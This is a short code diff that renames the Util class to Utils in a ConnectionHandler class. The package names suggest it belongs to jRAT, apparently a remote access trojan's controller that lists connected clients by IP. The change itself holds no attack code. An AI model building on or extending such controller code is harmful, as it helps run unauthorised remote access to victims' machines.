@@ -9,7 +9,7 @@ import pro.jrat.extensions.PluginEventHandler;
 import pro.jrat.packets.outgoing.Packet40Thumbnail;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.utils.TrayIconUtils;
-import pro.jrat.utils.Util;
+import pro.jrat.utils.Utils;
 
 public class ConnectionHandler {
 
@@ -44,7 +44,7 @@ public class ConnectionHandler {
 		
 		Main.connections.remove(client);
 		try {
-			Frame.mainModel.removeRow(Util.getRow(3, client.getIP()));
+			Frame.mainModel.removeRow(Utils.getRow(3, client.getIP()));
 		} catch (Exception ex) {
 		}
 		String title = Main.formatTitle();
